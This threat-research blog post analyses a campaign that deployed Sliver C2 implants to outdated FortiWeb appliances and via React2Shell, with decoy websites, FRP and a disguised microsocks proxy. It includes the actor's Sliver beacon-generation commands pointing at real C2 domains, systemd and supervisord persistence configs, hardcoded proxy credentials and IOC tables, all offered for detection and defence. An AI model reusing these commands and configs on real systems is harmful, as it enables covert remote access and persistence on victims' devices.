---
title: "Where is the EDR? Sliver C2 running from firewalls"
classes: wide
header:
  teaser: /assets/images/fortisliver/raw.png
ribbon: black
description: "Threat actor deploys Sliver C2 to FortiWeb appliances"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true

---

# Introduction

During routine open-directory threat-hunting on Censys, we identified a threat actor who had exposed Sliver C2 databases and logs, amongst other things. Analysis of these databases, logs and the corresponding infrastructure indicated the threat actor had successfully exploited multiple FortiWeb devices to deploy Sliver. This group also leveraged React2Shell (CVE-2025-55182) in order to deploy Sliver and leveraged the tool [fast reverse proxy (FRP)](https://github.com/fatedier/frp) to expose local services on victim hosts remotely.

[![1](/assets/images/fortisliver/4.png)](/assets/images/fortisliver/4.png){: .align-center}

> You can quickly hunt active ODs using Censys/Shodan, and find exposed infrastructure like this, although they are volatile and can quickly go down. If I'm not mistaken, [Hunt.io](https://hunt.io/) is the only platform that continously archives malicious open-directories. Noteably, some of the open-directories mentioned in this research are archived on the platform. Although we won't be sharing victim information or all files we collected from their open-directories, this data is accessible on the [Hunt.io](https://hunt.io/) platform.         

## Initial Access 

Evidence suggests that this threat group gained initial access via exploitation of public facing vulnerabilities, deploying Sliver C2 to victim hosts. The threat actor has leveraged React2Shell (CVE-2025-55182) and has also exploited numerous FortiWeb appliances. The exact vulnerability used to exploit the FortiWeb appliances is unknown, as we did not recover a POC for this, although they all are outdated. 

## Command & Control

### Sliver C2 

| C2 domain                  | Registration | C2 IP            | ASN   |
|----------------------------|--------------|------------------|-------|
| ns1.ubunutpackages[.]store | 2025-12-26   | 195.20.17[.]253 (active - 31/12/25)  | 62005 |
| ns1.bafairforce[.]army     | 2025-09-24   | 193.233.201[.]12 (active - 31/12/25) | 62005 |
| ns1.bafairforce[.]army     | 2025-09-24   | 45.150.108[.]43 (historic) | 62005 |
| ns1.bafairforce[.]army     | 2025-09-24   | 80.78.18[.]142 (historic) | 39287 |
| ns1.bafairforce[.]army     | 2025-09-24   | 192.81.210[.]81 (historic) | 14061 |

From analysis of C2 databases and logs, we can see the Sliver C2 running on `ns1.ubunutpackages[.]store` was created on 22/12/25 07:04 UTC. The majority of the victim hosts beaconing to this Sliver C2 instance are outdated FortiWeb appliances. Additionally, we can see the threat actor has created a fake "Ubuntu Packages" website for this domain:

```
generate beacon --http  ns1.ubunutpackages.store --reconnect 120 --strategy r --template ubuntu --os linux --evasion --save ./system-updater --seconds 60
websites add-content --website ubuntupackages --web-path / --content /root/dom/ubuntu-packages.html
https --domain ns1.ubunutpackages.store --cert /root/dom/cert.pem --key /root/dom/key.pem --website ubuntupackages
```

[![1](/assets/images/fortisliver/1.png)](/assets/images/fortisliver/1.png){: .align-center}

We can see the Sliver C2 domain `ns1.bafairforce[.]army` also has a "decoy" page impersonating the "Join Bangladesh Airforce".

```
generate beacon --http  ns1.bafairforce.army --reconnect 120 --strategy r --template ubuntu --os linux --evasion --save ./system-updater --seconds 60
websites add-content --website ipcheck --web-path / --content /home/user1/web/index.html
websites add-content --website ARMED_FORCES_DIVISION --web-path / --content /root/website-bd/index.html
https --domain ns1.bafairforce.army --cert /root/website-bd/cert.pem --key /root/website-bd/key.pem --website ARMED_FORCES_DIVISION
```

[![1](/assets/images/fortisliver/2.png)](/assets/images/fortisliver/2.png){: .align-center}

> The choice of impersonating the Bangladesh Airforce is not a coincidence. This is a strategic choice, multiple of the victims beaconing to the domain `bafairforce[.]army` can be organisations in Bangladesh.   

#### Sliver Implants

| Creation Date  | Implant Name       | C2 Domain                  | Hash                                                             |
|----------------|--------------------|----------------------------|------------------------------------------------------------------|
| 10/12/25 12:34 | DECENT_WATERBED    | testing.caai[.]in          | 4086057b9a0f9898c07318e093814ae9cfdaaf6ad71a45b2d0d4cd75e57f9354 |
| 22/12/25 07:03 | ESTIMATED_FOOT     | testing.caai[.]in          | 964473ffbd593fc52a779b1d699c79cc66b459cf842c2e6221703e2e6a2322c0 |
| 22/12/25 07:04 | DAMAGED_COPYRIGHT  | ns1.bafairforce[.]army     | 172a9ee9601ef0eb6fbd2676742edfb201c10369712dbf721e5d105aa1320a32 |
| 22/12/25 07:04 | ELEGANT_GO-KART    | ns1.bafairforce[.]army     | 3c24f30f2ca89d408d42293cab8fbb81cb9c2b0801074ef40f0a79770dac5956 |
| 26/12/25 10:45 | ARTIFICIAL_SUPPORT | ns1.ubunutpackages[.]store | 2897ee24de4cca2a4c6a085cf6fdccb6a89c6c23978529d81b4f4e6db46b0b96 |

#### Sliver on FortiWeb

We can see evidence of exploited FortiWeb devices from `5.4.202` - `6.1.62`. The Sliver binary was deployed to the path `/bin/.root/system-updater`. 

Noteably, we also observed 1 Chinese "victim" host that was not related to FortiWeb, and was deployed to `/app/web/system-updater`. 

| First beacon | Implant Name | OS | Arch | Country | Bin Path | OS Version | 
|-----|--------------------|-------|-------|----|---------------------------|--------------------------------------------------------|
|29/12/25 05:07:13| ARTIFICIAL_SUPPORT | linux | amd64 | US | /bin/.root/system-updater | Linux FortiWeb 5.4.202                                 |
|29/12/25 05:20:44| ARTIFICIAL_SUPPORT | linux | amd64 | SA | /bin/.root/system-updater | Linux FortiWeb 5.4.202                                 |
|29/12/25 05:58:59| ARTIFICIAL_SUPPORT | linux | amd64 | US | /bin/.root/system-updater | Linux FortiWeb 6.1.62                                  |
|29/12/25 06:03:59| ARTIFICIAL_SUPPORT | linux | amd64 | IN | /bin/.root/system-updater | Linux FortiWeb 5.4.202                                 |
|29/12/25 06:11:25| ARTIFICIAL_SUPPORT | linux | amd64 | US | /bin/.root/system-updater | Linux fweb-nt-fwb 6.1.62                               |
|29/12/25 06:47:57| ARTIFICIAL_SUPPORT | linux | amd64 | ZA | /bin/.root/system-updater | Linux FortiWeb 5.4.202                                 |
|29/12/25 06:53:55| ARTIFICIAL_SUPPORT | linux | amd64 | US | /bin/.root/system-updater | Linux FortiWeb 6.1.62                                  |
|29/12/25 07:06:20| ARTIFICIAL_SUPPORT | linux | amd64 | US | /bin/.root/system-updater | Linux FortiWeb 6.1.62                                  |
|29/12/25 07:10:39| ARTIFICIAL_SUPPORT | linux | amd64 | IN | /bin/.root/system-updater | Linux FortiWeb 5.4.202                                 |
|29/12/25 07:16:37| ARTIFICIAL_SUPPORT | linux | amd64 | IN | /bin/.root/system-updater | Linux FortiWeb 5.4.202                                 |
|29/12/25 12:45:05| ARTIFICIAL_SUPPORT | linux | amd64 | CN | /app/web/system-updater   | Linux a19f1ef3ded0 6.13.7-orbstack-00283-g9d1400e7e9c6 |

#### Sliver Persistence

The threat actor persisted on Linux hosts via the Systemd Service ([T1543.002](https://attack.mitre.org/techniques/T1543/002/)) and by modification of system processes ([T1543](https://attack.mitre.org/techniques/T1543)).

**Updater Service** 

```
[Unit]
Description=Updater Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/.root/system-updater

# Restart behavior
Restart=on-failure
RestartSec=5
[...REDACTED...]
# Logging
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

The above file, `updater.service`, was found on an open-directory exposing a systemd service configuration used for persistence. 

**Supervisord**

```
[supervisord]
nodaemon=true

[program:rootbinary]
command=/bin/.root/system-updater
autostart=true
autorestart=true
```

Additionally, we can see the threat actor has modified the `supervisor.conf` file in order to persist Sliver C2 execution. 

### Proxy Infrastructure

#### FRP

After deploying Sliver C2 to victim hosts, they leveraged the framework to deploy further proxying tooling. Noteably, the [Fast Reverse Proxy (frp)](https://github.com/fatedier/frp) was leveraged.

We observed the tool and configuration being hosted on `hXXp://45.83.181[.]160:8003/frpc.toml` which was downloaded onto victim hosts. The FRP Server (frps) shows multiple active victims. 

[![1](/assets/images/fortisliver/3.png)](/assets/images/fortisliver/3.png){: .align-center}

We can corroborate victim IP addresses within Sliver databases with the FRP server.

#### microsocks

Aside from using FRP, the threat actor leveraged the open-source tool [microsocks](https://github.com/rofl0r/microsocks), that was delivered the file `cups-lpd`. Analysing the binary we can see this will expose the SOCKS service on port 515, which is noteable as this is the expected port that the legitimate Linux CUPS Line Printer Daemon will listen on:

[![1](/assets/images/fortisliver/6.png)](/assets/images/fortisliver/6.png){: .align-center}

This microsocks service was once persisted via a Systemd service:

```
[Unit]
Description=Updater Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/.root/cups-lpd
[...REDACTED...]
```

From the beacon databases, we can find the exposed SOCKS services running on port `515` on FortiWeb hosts on Censys:

[![1](/assets/images/fortisliver/7.png)](/assets/images/fortisliver/7.png){: .align-center}


Noteably, although not used in the above case, this also had hardcoded credentials that could've been used `Monkhood6703:64d9cb9c5f075dfaa371a6f`, if the `cups-lpd` service was run with a `-1/-w` switch. 

[![1](/assets/images/fortisliver/5.png)](/assets/images/fortisliver/5.png){: .align-center}

#### Victimology 

Across the C2 databases recovered, and exclusing FP or sandbox hostnames, there were 30 unique IP addresses that were beaconing. Multiple  victims were observed in Pakistan and Bangladesh, including organisations in the financial and government sector.  

[![1](/assets/images/fortisliver/8.png)](/assets/images/fortisliver/8.png){: .align-center}

[![1](/assets/images/fortisliver/10.png)](/assets/images/fortisliver/10.png){: .align-center}


## Conclusion

These attacks highlight a massive blindspot in visibility and telemetry for organisations using edge appliances like FortiWeb. In this case, we only had evidence of potential exploitation due to the operator leaving Sliver logs and databases exposed. These devices typically don't have inbuilt AV/EDR, and I've not heard of people installing their own. This makes sufficently and effectively threat hunting for this activity, on appliances, incredibly difficult.  

Although the first C2 domain was registered 3 months earlier, recovered data indicates 30 unique and real hosts were onboarded in just eight days (2025-12-22 to 2025-12-30). The use of Bangladesh-themed decoy pages and C2 infrastructure aligned with some interesting Bangladesh victims found within the databases, suggesting this operation was more targeted than opportunsitic. Finally, the use of a renamed `microsocks` binary (`cups-lpd`), bound to port 515 to masquearade as CUPs, running from a Systemd service on the FortiWeb appliance highlights the effort the threat actor has taken to blend in and attempt to persist.     

# IOCs

## Payloads / Tooling

| Type           | Name               | SHA256                                                             | Created                           | Notes                                                                           |
| -------------- | ------------------ | ------------------------------------------------------------------ | --------------------------------- | ------------------------------------------------------------------------------- |
| Sliver implant | DECENT_WATERBED    | `4086057b9a0f9898c07318e093814ae9cfdaaf6ad71a45b2d0d4cd75e57f9354` | 10/12/25 12:34                    | C2: `testing.caai[.]in`                                                         |
| Sliver implant | ESTIMATED_FOOT     | `964473ffbd593fc52a779b1d699c79cc66b459cf842c2e6221703e2e6a2322c0` | 22/12/25 07:03                    | C2: `testing.caai[.]in`                                                         |
| Sliver implant | DAMAGED_COPYRIGHT  | `172a9ee9601ef0eb6fbd2676742edfb201c10369712dbf721e5d105aa1320a32` | 22/12/25 07:04                    | C2: `ns1.bafairforce[.]army`                                                    |
| Sliver implant | ELEGANT_GO-KART    | `3c24f30f2ca89d408d42293cab8fbb81cb9c2b0801074ef40f0a79770dac5956` | 22/12/25 07:04                    | C2: `ns1.bafairforce[.]army`                                                    |
| Sliver implant | ARTIFICIAL_SUPPORT | `2897ee24de4cca2a4c6a085cf6fdccb6a89c6c23978529d81b4f4e6db46b0b96` | 26/12/25 (10:45 in implant table) | C2: `ns1.ubunutpackages[.]store`                                                |
| Proxy binary   | `cups_lpd`         | `dafc7517669e931de858464966af995c44c2e7c6bdf684d53c54d6503cd48a38` | —                                 | “microsocks” proxy, port **515**; creds: `Monkhood6703:64d9cb9c5f075dfaa371a6f` |

## Network

| Type     | Indicator                            | Notes                                                                                                                                                                                 |
| -------- | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| URL / C2 | `https://ns1.ubunutpackages[.]store` | Targeting FortiWeb instances; observed from `195.20.17[.]253`; domain registered **2025-12-26**                                                                                       |
| URL / C2 | `https://ns1.bafairforce[.]army`     | Targeting FortiWeb + React2Shell; observed from `193.233.201[.]12`; domain registration date appears as **2025-09-24**                                                                |
| IP       | `195.20.17[.]253`                    | Sliver C2; open directory observed                                                                                                                                                    |
| IP       | `45.143.167[.]7`                     | Sliver C2; open directory observed                                                                                                                                                    |
| IP       | `45.150.108.43`                      | Sliver C2                                                                                                                                                                             | 
| IP       | `45.83.181[.]160`                    | Fast Reverse Proxy (FRP) server; open directory observed                                                                                                                              |
| IP       | `193.233.201[.]12`                   | Associated with `ns1.bafairforce[.]army`; Sliver C2; open directory observed                                                                                                          |

| C2 domain                    | Registration (reported) | C2 IP              | Status/Notes      |   ASN |
| ---------------------------- | ----------------------: | ------------------ | ----------------- | ----: |
| `ns1.ubunutpackages[.]store` |              2025-12-26 | `195.20.17[.]253`  | active (31/12/25) | 62005 |
| `ns1.bafairforce[.]army`     |              2025-09-24 | `193.233.201[.]12` | active (31/12/25) | 62005 |
| `ns1.bafairforce[.]army`     |              2025-09-24 | `45.150.108[.]43`  | historic          | 62005 |
| `ns1.bafairforce[.]army`     |              2025-09-24 | `80.78.18[.]142`   | historic          | 39287 |
| `ns1.bafairforce[.]army`     |              2025-09-24 | `192.81.210[.]81`  | historic          | 14061 |

